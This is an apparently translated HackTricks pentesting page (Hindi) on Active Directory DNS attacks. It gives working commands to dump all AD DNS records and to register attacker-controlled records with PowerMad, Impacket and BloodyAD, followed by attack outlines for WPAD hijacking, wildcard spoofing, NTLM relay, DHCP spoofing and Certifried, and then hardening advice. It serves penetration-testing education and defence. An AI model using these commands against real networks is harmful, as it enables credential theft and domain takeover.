# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

डिफ़ॉल्ट रूप से **कोई भी उपयोगकर्ता** Active Directory में **डोमेन या फॉरेस्ट DNS ज़ोन में सभी DNS रिकॉर्ड** की **सूची बना सकता है**, जो एक ज़ोन ट्रांसफर के समान है (उपयोगकर्ता AD वातावरण में DNS ज़ोन के बच्चे ऑब्जेक्ट्स की सूची बना सकते हैं)।

उपकरण [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) **सूची बनाने** और **आंतरिक नेटवर्क के पुनः खोज उद्देश्यों के लिए ज़ोन में **सभी DNS रिकॉर्ड** का **निर्यात** करने की अनुमति देता है।
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (अप्रैल 2025) JSON/Greppable (`--json`) आउटपुट, मल्टी-थ्रेडेड DNS समाधान और LDAPS से बाइंड करते समय TLS 1.2/1.3 के लिए समर्थन जोड़ता है

अधिक जानकारी के लिए पढ़ें [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## रिकॉर्ड बनाना / संशोधित करना (ADIDNS स्पूफिंग)

क्योंकि **Authenticated Users** समूह के पास डिफ़ॉल्ट रूप से ज़ोन DACL पर **Create Child** है, कोई भी डोमेन खाता (या कंप्यूटर खाता) अतिरिक्त रिकॉर्ड पंजीकृत कर सकता है।  इसका उपयोग ट्रैफ़िक हाईजैकिंग, NTLM रिले मजबूर करने या यहां तक कि पूर्ण डोमेन समझौते के लिए किया जा सकता है।

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py Impacket ≥0.12.0 के साथ आता है)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## सामान्य हमले के प्राथमिक तत्व

1. **Wildcard record** – `*.<zone>` AD DNS सर्वर को LLMNR/NBNS स्पूफिंग के समान एक एंटरप्राइज-व्यापी रिस्पॉन्डर में बदल देता है। इसका दुरुपयोग NTLM हैश कैप्चर करने या उन्हें LDAP/SMB पर रिले करने के लिए किया जा सकता है।  (WINS-लुकअप को बंद करना आवश्यक है।)
2. **WPAD hijack** – `wpad` (या एक **NS** रिकॉर्ड जो हमलावर होस्ट की ओर इशारा करता है ताकि Global-Query-Block-List को बायपास किया जा सके) जोड़ें और क्रेडेंशियल्स को इकट्ठा करने के लिए आउटबाउंड HTTP अनुरोधों को पारदर्शी रूप से प्रॉक्सी करें।  Microsoft ने वाइल्डकार्ड/ DNAME बायपास (CVE-2018-8320) को पैच किया, लेकिन **NS-रिकॉर्ड अभी भी काम करते हैं**।
3. **Stale entry takeover** – उस IP पते का दावा करें जो पहले किसी वर्कस्टेशन का था और संबंधित DNS प्रविष्टि अभी भी हल होगी, जिससे संसाधन-आधारित सीमित प्रतिनिधित्व या Shadow-Credentials हमलों को DNS को छुए बिना सक्षम किया जा सकेगा।
4. **DHCP → DNS spoofing** – एक डिफ़ॉल्ट Windows DHCP+DNS तैनाती पर, एक अनधिकृत हमलावर जो समान सबनेट पर है, किसी भी मौजूदा A रिकॉर्ड (जिसमें डोमेन कंट्रोलर शामिल हैं) को ओवरराइट कर सकता है, धोखाधड़ी DHCP अनुरोध भेजकर जो गतिशील DNS अपडेट को ट्रिगर करते हैं (Akamai “DDSpoof”, 2023)।  यह Kerberos/LDAP पर मशीन-इन-द-मिडिल देता है और पूर्ण डोमेन अधिग्रहण की ओर ले जा सकता है।
5. **Certifried (CVE-2022-26923)** – एक मशीन खाते का `dNSHostName` बदलें जिसे आप नियंत्रित करते हैं, एक मेल खाते A रिकॉर्ड को पंजीकृत करें, फिर उस नाम के लिए एक प्रमाणपत्र का अनुरोध करें ताकि DC का अनुकरण किया जा सके। **Certipy** या **BloodyAD** जैसे उपकरण पूरी प्रक्रिया को स्वचालित करते हैं।

---

## पहचान और हार्डनिंग

* संवेदनशील क्षेत्रों पर **Authenticated Users** को *Create all child objects* अधिकार से वंचित करें और DHCP द्वारा उपयोग किए जाने वाले समर्पित खाते को गतिशील अपडेट का प्रतिनिधित्व करने के लिए सौंपें।
* यदि गतिशील अपडेट की आवश्यकता है, तो क्षेत्र को **Secure-only** पर सेट करें और DHCP में **Name Protection** सक्षम करें ताकि केवल मालिक कंप्यूटर ऑब्जेक्ट अपनी स्वयं की रिकॉर्ड को ओवरराइट कर सके।
* DNS सर्वर इवेंट आईडी 257/252 (गतिशील अपडेट), 770 (क्षेत्र स्थानांतरण) और `CN=MicrosoftDNS,DC=DomainDnsZones` पर LDAP लेखन की निगरानी करें।
* खतरनाक नामों (`wpad`, `isatap`, `*`) को जानबूझकर बेनिग्न रिकॉर्ड या Global Query Block List के माध्यम से ब्लॉक करें।
* DNS सर्वरों को पैच रखें – उदाहरण के लिए, RCE बग CVE-2024-26224 और CVE-2024-26231 ने **CVSS 9.8** तक पहुंचा और डोमेन कंट्रोलर्स के खिलाफ दूरस्थ रूप से शोषण योग्य हैं।

## संदर्भ

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, अभी भी वाइल्डकार्ड/WPAD हमलों के लिए डिफ़ॉल्ट संदर्भ)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
{{#include ../../banners/hacktricks-training.md}}
